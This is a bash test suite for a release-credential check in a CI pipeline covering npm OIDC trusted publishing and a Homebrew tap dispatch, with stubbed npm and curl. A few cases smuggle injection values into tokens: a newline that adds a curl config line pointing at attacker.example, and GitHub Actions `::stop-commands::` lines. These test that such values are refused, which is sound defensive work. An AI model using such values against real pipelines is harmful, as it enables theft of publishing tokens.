#!/usr/bin/env bash
#
# Tests for scripts/ci/check-release-credentials.sh
#
# Usage:
#   bash scripts/ci/test-release-credentials.sh
#
# Each case puts stub `npm` and `curl` programs first on PATH. The stubs
# answer like the npm CLI, the GitHub OIDC token service, the npm registry
# and the GitHub API, and log each call, so no case reaches the network.

set -uo pipefail

SCRIPT="$(cd "$(dirname "$0")" && pwd)/check-release-credentials.sh"
PLATFORMS="cli-darwin-arm64 cli-linux-x64"
REQUEST_URL="https://token.actions.example/id?api-version=2.0"
REQUEST_TOKEN="stub-request-token"
ID_TOKEN="stub.id-token.sig"
NPM_OIDC_TOKEN="stub-npm-oidc-token"
TAP_TOKEN="stub-tap-token"
TESTS_PASSED=0
TESTS_FAILED=0

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

# Stub npm: STUB_NPM_VERSION is what `npm --version` prints (default 11.19.1).
# Any other npm command is logged and fails.
cat > "$WORK/npm" <<'STUB'
#!/usr/bin/env bash
echo "npm $*" >> "$STUB_LOG"
if [ "$1" = --version ]; then
  echo "${STUB_NPM_VERSION-11.19.1}"
  exit 0
fi
echo "stub npm: unexpected command $1" >&2
exit 99
STUB

# Stub curl. Like the real curl, it reads a config from stdin only with
# `-K -`, and prints the HTTP code only with `-w '%{http_code}'`. Each
# service gives HTTP 401 when the call does not send its own token.
# Behaviour comes from these variables:
#   STUB_CURL_EXIT      a curl exit code with no response (prints 000)
#   STUB_ID_CODE        HTTP code of the ID token request (default 200)
#   STUB_ID_BODY        body of the ID token response
#   STUB_DENY           a package (URL form) with no trusted publisher, or "all"
#   STUB_DENY_CODE      HTTP code for that package (default 404)
#   STUB_DENY_BODY      body for that package
#   STUB_EXCHANGE_LOST  a package (URL form) whose exchange gets no response
#   STUB_EXCHANGE_CODE  HTTP code of an accepted exchange (default 201)
#   STUB_EXCHANGE_BODY  body of an accepted exchange
#   STUB_DISPATCH_CODE  HTTP code of the dispatch (default 204)
cat > "$WORK/curl" <<'STUB'
#!/usr/bin/env bash
echo "curl $*" >> "$STUB_LOG"
out=/dev/null
url=""
method=GET
config=""
write_code=0
prev=""
for arg in "$@"; do
  case "$prev" in
    -o) out="$arg" ;;
    -X) method="$arg" ;;
    -K) [ "$arg" = - ] && config=$(cat) ;;
    -w) [ "$arg" = '%{http_code}' ] && write_code=1 ;;
  esac
  case "$arg" in
    https://*) url="$arg" ;;
  esac
  prev="$arg"
done
bearer=$(sed -n 's/^header = "Authorization: Bearer \(.*\)"$/\1/p' <<< "$config")
echo "auth ${bearer:-none}" >> "$STUB_LOG"
if [ "${STUB_CURL_EXIT:-0}" != 0 ]; then
  [ "$write_code" = 1 ] && printf '000'
  echo "curl: (7) Failed to connect" >&2
  exit "$STUB_CURL_EXIT"
fi
pkg="${url##*/package/}"
if [ -n "${STUB_EXCHANGE_LOST:-}" ] && [ "$pkg" = "$STUB_EXCHANGE_LOST" ]; then
  [ "$write_code" = 1 ] && printf '000'
  echo "curl: (56) Recv failure" >&2
  exit 56
fi
body='{"message":"not found"}'
id_body='{"value":"stub.id-token.sig"}'
exchange_body='{"token":"stub-npm-oidc-token"}'
deny_body='{"message":"no trusted publisher"}'
[ -n "${STUB_ID_BODY+set}" ] && id_body="$STUB_ID_BODY"
[ -n "${STUB_EXCHANGE_BODY+set}" ] && exchange_body="$STUB_EXCHANGE_BODY"
[ -n "${STUB_DENY_BODY+set}" ] && deny_body="$STUB_DENY_BODY"
case "$method $url" in
  "GET https://token.actions.example/"*)
    if [ "$bearer" != stub-request-token ]; then code=401
    else code="${STUB_ID_CODE:-200}"; body="$id_body"; fi ;;
  "POST https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/"*)
    if [ "$bearer" != stub.id-token.sig ]; then code=401; body='{"message":"invalid token"}'
    elif [ "${STUB_DENY:-}" = all ] || [ "$pkg" = "${STUB_DENY:-}" ]; then
      code="${STUB_DENY_CODE:-404}"; body="$deny_body"
    else
      code="${STUB_EXCHANGE_CODE:-201}"; body="$exchange_body"
    fi ;;
  "POST https://api.github.com/repos/dean0x/homebrew-tap/dispatches")
    if [ "$bearer" != stub-tap-token ]; then code=401; body='{"message":"Bad credentials"}'
    else code="${STUB_DISPATCH_CODE:-204}"; body=""; fi ;;
  *) code=404 ;;
esac
printf '%s' "$body" > "$out"
[ "$write_code" = 1 ] && printf '%s' "$code"
exit 0
STUB
chmod +x "$WORK/npm" "$WORK/curl"

# run_check MODE [VAR=value ...] — runs the script with the stubs and a fresh
# log. Sets OUT (stdout and stderr), CODE (exit code) and CALLS (the log).
run_check() {
  local mode="$1"
  shift
  export STUB_LOG="$WORK/calls.log"
  : > "$STUB_LOG"
  # The script makes its temp file here, so a case can check that it is gone.
  rm -rf "$WORK/tmp"
  mkdir "$WORK/tmp"
  OUT=$(env PATH="$WORK:$PATH" TMPDIR="$WORK/tmp" NPM_PLATFORM_PACKAGES="$PLATFORMS" \
    ACTIONS_ID_TOKEN_REQUEST_URL="$REQUEST_URL" ACTIONS_ID_TOKEN_REQUEST_TOKEN="$REQUEST_TOKEN" \
    HOMEBREW_TAP_TOKEN="$TAP_TOKEN" "$@" bash "$SCRIPT" "$mode" 2>&1 < /dev/null)
  CODE=$?
  CALLS=$(cat "$STUB_LOG")
}

expect() {
  local name="$1"
  shift
  if "$@"; then
    echo "✓ $name"
    TESTS_PASSED=$((TESTS_PASSED + 1))
  else
    echo "✗ $name"
    echo "  exit: $CODE"
    echo "  output: $OUT"
    echo "  calls: $CALLS"
    TESTS_FAILED=$((TESTS_FAILED + 1))
  fi
}

count() { grep -c -- "$1" <<< "$2"; }
EXCHANGE="https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package"

case_trusted_publishing_passes() {
  run_check npm
  [ "$CODE" = 0 ] &&
    [ "$(count '^curl .*-X GET .*https://token.actions.example/id?api-version=2.0&audience=npm%3Aregistry.npmjs.org$' "$CALLS")" = 3 ] &&
    [ "$(count '^curl .*-X POST' "$CALLS")" = 3 ] &&
    grep -q -- "-X POST .*$EXCHANGE/rskim\$" <<< "$CALLS" &&
    grep -q -- "-X POST .*$EXCHANGE/@rskim%2fcli-darwin-arm64\$" <<< "$CALLS" &&
    grep -q -- "-X POST .*$EXCHANGE/@rskim%2fcli-linux-x64\$" <<< "$CALLS" &&
    [ "$(count 'trusted publishing accepts this workflow' "$OUT")" = 3 ]
}

case_exchange_sends_id_token_and_no_body() {
  run_check npm
  # A new ID token for each package, as npm publish gets one.
  [ "$CODE" = 0 ] && [ "$(count "^auth $REQUEST_TOKEN\$" "$CALLS")" = 3 ] &&
    [ "$(count "^auth $ID_TOKEN\$" "$CALLS")" = 3 ] &&
    ! grep -q -- '-X POST .* -d ' <<< "$CALLS"
}

case_request_url_without_query() {
  run_check npm ACTIONS_ID_TOKEN_REQUEST_URL=https://token.actions.example/id
  [ "$CODE" = 0 ] &&
    grep -q -- '-X GET .*https://token.actions.example/id?audience=npm%3Aregistry.npmjs.org$' <<< "$CALLS"
}

case_no_token_in_argv_or_output() {
  run_check npm
  local npm_calls="$CALLS" npm_out
  npm_out=$(grep -v '^::add-mask::' <<< "$OUT")
  run_check homebrew
  # The stub logs the token it got on "auth" lines; argv is on "curl" lines.
  ! grep '^curl ' <<< "$npm_calls"$'\n'"$CALLS" | grep -q "$REQUEST_TOKEN\|$ID_TOKEN\|$NPM_OIDC_TOKEN\|$TAP_TOKEN" &&
    ! grep -q "$REQUEST_TOKEN\|$ID_TOKEN\|$NPM_OIDC_TOKEN\|$TAP_TOKEN" <<< "$npm_out$OUT"
}

case_tokens_are_masked() {
  run_check npm
  grep -qx "::add-mask::$ID_TOKEN" <<< "$OUT" &&
    [ "$(count "^::add-mask::$NPM_OIDC_TOKEN\$" "$OUT")" = 3 ]
}

case_no_npm_command_but_version() {
  run_check npm
  [ "$(grep -c '^npm ' <<< "$CALLS")" = 1 ] && grep -qx 'npm --version' <<< "$CALLS"
}

case_old_npm_fails() {
  run_check npm STUB_NPM_VERSION=11.5.0
  [ "$CODE" = 1 ] && grep -q 'npm 11.5.0 has no trusted publishing' <<< "$OUT" &&
    ! grep -q '^curl' <<< "$CALLS"
}

case_npm_10_fails() {
  run_check npm STUB_NPM_VERSION=10.9.8
  [ "$CODE" = 1 ] && ! grep -q '^curl' <<< "$CALLS"
}

case_min_npm_passes() {
  run_check npm STUB_NPM_VERSION=11.5.1
  [ "$CODE" = 0 ]
}

case_unreadable_npm_version_fails() {
  run_check npm STUB_NPM_VERSION=
  [ "$CODE" = 1 ] && grep -q 'can not read the npm version' <<< "$OUT" &&
    ! grep -q '^curl' <<< "$CALLS"
}

case_no_id_token_permission_fails() {
  run_check npm ACTIONS_ID_TOKEN_REQUEST_URL= ACTIONS_ID_TOKEN_REQUEST_TOKEN=
  [ "$CODE" = 1 ] && grep -q 'needs permissions: id-token: write' <<< "$OUT" &&
    ! grep -q '^curl' <<< "$CALLS"
}

case_id_token_refused_fails() {
  run_check npm STUB_ID_CODE=403
  [ "$CODE" = 1 ] && [ "$(count 'GitHub gave no valid OIDC ID token for .* (HTTP 403)' "$OUT")" = 3 ] &&
    ! grep -q -- '-X POST' <<< "$CALLS"
}

case_id_token_missing_value_fails() {
  run_check npm 'STUB_ID_BODY={"count":1}'
  [ "$CODE" = 1 ] && grep -q 'GitHub gave no valid OIDC ID token for rskim (HTTP 200)' <<< "$OUT" &&
    ! grep -q -- '-X POST' <<< "$CALLS"
}

case_id_token_not_json_fails() {
  run_check npm 'STUB_ID_BODY=<html>'
  [ "$CODE" = 1 ] && ! grep -q -- '-X POST' <<< "$CALLS"
}

case_no_trusted_publisher_fails() {
  run_check npm STUB_DENY=all
  [ "$CODE" = 1 ] &&
    [ "$(count 'has no trusted publisher for this repository and workflow (HTTP 404: no trusted publisher)' "$OUT")" = 3 ]
}

case_one_package_without_publisher_fails() {
  run_check npm STUB_DENY=@rskim%2fcli-linux-x64
  [ "$CODE" = 1 ] &&
    grep -q '@rskim/cli-linux-x64 has no trusted publisher' <<< "$OUT" &&
    [ "$(count 'has no trusted publisher' "$OUT")" = 1 ] &&
    [ "$(count 'trusted publishing accepts this workflow' "$OUT")" = 2 ]
}

case_exchange_without_token_fails() {
  run_check npm 'STUB_EXCHANGE_BODY={"ok":true}'
  [ "$CODE" = 1 ] && [ "$(count 'has no trusted publisher' "$OUT")" = 3 ]
}

case_exchange_redirect_fails() {
  run_check npm STUB_EXCHANGE_CODE=307
  [ "$CODE" = 1 ] && [ "$(count '(HTTP 307' "$OUT")" = 3 ]
}

case_no_response_fails() {
  run_check npm STUB_CURL_EXIT=7
  [ "$CODE" = 1 ] && grep -q 'GitHub gave no valid OIDC ID token for rskim (HTTP 000)' <<< "$OUT"
}

case_no_platform_list_fails() {
  run_check npm NPM_PLATFORM_PACKAGES=
  [ "$CODE" != 0 ] && ! grep -q -- '-X POST' <<< "$CALLS"
}

case_temp_file_removed() {
  run_check npm
  local after_pass
  after_pass=$(ls -A "$WORK/tmp")
  run_check npm STUB_DENY=all
  [ -z "$after_pass" ] && [ -z "$(ls -A "$WORK/tmp")" ] && [ "$CODE" = 1 ]
}

case_newer_npm_passes() {
  run_check npm STUB_NPM_VERSION=11.10.0
  local minor_code="$CODE"
  run_check npm STUB_NPM_VERSION=12.0.0
  [ "$minor_code" = 0 ] && [ "$CODE" = 0 ]
}

case_exchange_refused_403_fails() {
  run_check npm STUB_DENY=all STUB_DENY_CODE=403
  [ "$CODE" = 1 ] && [ "$(count '(HTTP 403: no trusted publisher)' "$OUT")" = 3 ]
}

case_one_exchange_lost_fails() {
  run_check npm STUB_EXCHANGE_LOST=@rskim%2fcli-darwin-arm64
  [ "$CODE" = 1 ] &&
    grep -q '@rskim/cli-darwin-arm64 has no trusted publisher for this repository and workflow (HTTP 000: )' <<< "$OUT" &&
    [ "$(count 'trusted publishing accepts this workflow' "$OUT")" = 2 ]
}

case_exchange_body_not_json_fails() {
  run_check npm 'STUB_EXCHANGE_BODY=<html>'
  [ "$CODE" = 1 ] && [ "$(count 'has no trusted publisher' "$OUT")" = 3 ]
}

case_exchange_two_objects_fails() {
  run_check npm 'STUB_EXCHANGE_BODY={"token":"tok-a"}{"token":"tok-b"}'
  [ "$CODE" = 1 ] && ! grep -q 'tok-a\|tok-b' <<< "$OUT"
}

case_exchange_second_object_ignored() {
  # Only the second value has a token. The body must be one object, so this fails.
  run_check npm 'STUB_EXCHANGE_BODY={"ok":true}{"token":"tok-b"}'
  [ "$CODE" = 1 ] && [ "$(count 'has no trusted publisher' "$OUT")" = 3 ]
}

case_homebrew_token_with_newline_refused() {
  # A token that could add a line to the curl config is never sent.
  run_check homebrew HOMEBREW_TAP_TOKEN=$'stub-tap-token"\nurl = "https://attacker.example/x'
  [ "$CODE" = 1 ] && grep -q '(HTTP 000' <<< "$OUT"
}

case_bad_exchange_token_fails() {
  run_check npm STUB_EXCHANGE_BODY='{"token":"tok-a\n::stop-commands::zz"}'
  [ "$CODE" = 1 ] && ! grep -q '^::stop-commands' <<< "$OUT" && ! grep -q 'tok-a' <<< "$OUT"
}

case_bad_id_token_fails() {
  run_check npm STUB_ID_BODY='{"value":"aaa.bbb.ccc\"\nurl = \"https://attacker.example/x"}'
  [ "$CODE" = 1 ] && ! grep -q -- '-X POST' <<< "$CALLS" &&
    ! grep -q 'attacker' <<< "$OUT"
}

case_id_token_not_jwt_fails() {
  run_check npm 'STUB_ID_BODY={"value":"not-a-jwt"}'
  [ "$CODE" = 1 ] && ! grep -q -- '-X POST' <<< "$CALLS"
}

case_message_control_chars_removed() {
  run_check npm STUB_DENY=all STUB_DENY_BODY='{"message":"denied\n::stop-commands::zz"}'
  [ "$CODE" = 1 ] && ! grep -q '^::stop-commands' <<< "$OUT" &&
    [ "$(count '(HTTP 404: denied ::stop-commands::zz)' "$OUT")" = 3 ]
}

case_homebrew_accepted_passes() {
  run_check homebrew
  [ "$CODE" = 0 ] && grep -q 'dispatch accepted' <<< "$OUT" &&
    grep -q -- '-X POST .*skim-release-credential-check.* https://api.github.com/repos/dean0x/homebrew-tap/dispatches$' <<< "$CALLS" &&
    grep -qx "auth $TAP_TOKEN" <<< "$CALLS"
}

case_homebrew_refused_fails() {
  run_check homebrew HOMEBREW_TAP_TOKEN=wrong
  [ "$CODE" = 1 ] && grep -q 'can not send a dispatch to dean0x/homebrew-tap (HTTP 401: Bad credentials)' <<< "$OUT"
}

case_homebrew_redirect_fails() {
  run_check homebrew STUB_DISPATCH_CODE=307
  [ "$CODE" = 1 ] && grep -q '(HTTP 307' <<< "$OUT"
}

case_homebrew_no_response_fails() {
  run_check homebrew STUB_CURL_EXIT=6
  [ "$CODE" = 1 ] && grep -q '(HTTP 000' <<< "$OUT"
}

case_unknown_mode_fails() {
  run_check crates
  [ "$CODE" = 2 ] && [ -z "$CALLS" ]
}

echo ""
echo "Release credential check tests"
echo ""
expect "trusted publishing passes for every package" case_trusted_publishing_passes
expect "each exchange sends the ID token and no body" case_exchange_sends_id_token_and_no_body
expect "a request URL with no query gets ?audience" case_request_url_without_query
expect "no token is in argv or in the output" case_no_token_in_argv_or_output
expect "the ID token and each npm token are masked" case_tokens_are_masked
expect "the npm check runs no npm command but --version" case_no_npm_command_but_version
expect "npm 11.5.0 fails before any request" case_old_npm_fails
expect "npm 10 fails before any request" case_npm_10_fails
expect "npm 11.5.1 passes" case_min_npm_passes
expect "an unreadable npm version fails before any request" case_unreadable_npm_version_fails
expect "no id-token permission fails before any request" case_no_id_token_permission_fails
expect "a refused ID token request fails with no exchange" case_id_token_refused_fails
expect "an ID token response with no value fails with no exchange" case_id_token_missing_value_fails
expect "an ID token response that is not JSON fails with no exchange" case_id_token_not_json_fails
expect "no trusted publisher (HTTP 404) fails for every package" case_no_trusted_publisher_fails
expect "one package with no trusted publisher fails for that package" case_one_package_without_publisher_fails
expect "an exchange with no token in the body fails" case_exchange_without_token_fails
expect "a redirected exchange (HTTP 307) fails" case_exchange_redirect_fails
expect "no response fails" case_no_response_fails
expect "an empty platform package list fails with no exchange" case_no_platform_list_fails
expect "the temp file is gone after a pass and after a fail" case_temp_file_removed
expect "npm 11.10.0 and npm 12.0.0 pass" case_newer_npm_passes
expect "a refused exchange (HTTP 403) fails" case_exchange_refused_403_fails
expect "one exchange with no response fails for that package" case_one_exchange_lost_fails
expect "an exchange body that is not JSON fails" case_exchange_body_not_json_fails
expect "an exchange body with two JSON values fails and prints no token" case_exchange_two_objects_fails
expect "a token only in a second JSON value fails" case_exchange_second_object_ignored
expect "a token that could add a curl config line is not sent" case_homebrew_token_with_newline_refused
expect "an exchanged token with a newline fails and prints nothing of it" case_bad_exchange_token_fails
expect "an ID token with a quote and a newline fails with no exchange" case_bad_id_token_fails
expect "an ID token that is not a JWT fails with no exchange" case_id_token_not_jwt_fails
expect "control characters leave a printed message" case_message_control_chars_removed
expect "an accepted Homebrew dispatch (HTTP 204) passes" case_homebrew_accepted_passes
expect "a refused Homebrew dispatch (HTTP 401) fails" case_homebrew_refused_fails
expect "a redirected Homebrew dispatch (HTTP 307) fails" case_homebrew_redirect_fails
expect "no response to the Homebrew dispatch fails" case_homebrew_no_response_fails
expect "an unknown mode exits 2 and calls nothing" case_unknown_mode_fails
echo ""
echo "Passed: $TESTS_PASSED, failed: $TESTS_FAILED"
[ "$TESTS_FAILED" = 0 ]
